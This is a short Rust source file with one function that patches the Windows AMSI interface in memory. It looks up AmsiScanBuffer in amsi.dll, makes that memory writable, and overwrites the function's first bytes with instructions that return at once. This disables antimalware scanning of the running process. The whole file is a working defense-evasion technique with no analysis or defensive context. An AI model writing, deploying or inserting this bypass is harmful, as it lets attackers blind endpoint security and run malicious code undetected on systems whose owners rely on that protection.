use std::ffi::CString;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

pub fn patch_amsi() {
    let dll_name = match CString::new("amsi.dll") {
        Ok(n) => n,
        Err(_) => return,
    };
    let fn_name = match CString::new("AmsiScanBuffer") {
        Ok(n) => n,
        Err(_) => return,
    };

    unsafe {
        let dll_pcstr = PCSTR(dll_name.as_ptr() as *const u8);
        let fn_pcstr = PCSTR(fn_name.as_ptr() as *const u8);
        let handle = GetModuleHandleA(dll_pcstr);
        let handle = if handle.is_err() {
            match LoadLibraryA(dll_pcstr) {
                Ok(h) => h,
                Err(_) => return,
            }
        } else {
            handle.unwrap()
        };

        let func = GetProcAddress(handle, fn_pcstr);
        let func = match func {
            Some(f) => f,
            None => return,
        };

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        let patch = if cfg!(target_pointer_width = "64") {
            &[
                0x31u8,
                0xc0u8,
                0xc3u8,
            ] as &[u8]
        } else {
            &[
                0x31u8,
                0xc0u8,
                0xc2u8,
                0x08u8,
                0x00u8,
            ] as &[u8]
        };

        if VirtualProtect(
            func as *const std::ffi::c_void,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .is_ok()
        {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), func as *mut u8, patch.len());
            let _ = VirtualProtect(
                func as *const std::ffi::c_void,
                patch.len(),
                old_protect,
                &mut old_protect,
            );
        }
    }
}
